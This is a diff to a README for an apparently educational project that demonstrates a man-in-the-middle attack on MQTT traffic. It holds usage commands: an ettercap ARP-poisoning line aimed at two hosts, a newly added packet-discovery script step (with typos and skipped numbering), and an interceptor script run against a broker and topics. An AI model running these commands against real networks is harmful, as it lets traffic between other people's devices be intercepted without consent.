@@ -28,10 +28,13 @@ This project demonstrates a Man-in-the-Middle (MITM) attack on MQTT (Message Que
 1. **Use**:
    ```bash
    sudo ettercap -T -q -i <your interface> -M arp:remote /<ip1>// /<ip2>//
-2. ***Open a New Terminal and run**:
+2. **discolver packet***:
+    ```python
+    sudo python3 Mqtt_disclover
+4. **Open a New Terminal and run**:
    ```python
    python mqtt_interceptor.py -b <broker_ip> -t <topic1> <topic2> ...
-3. **example**
+5. **example**
      ```python
      python mqtt_interceptor.py -b 192.168.1.50 -t topic1 topic2
 
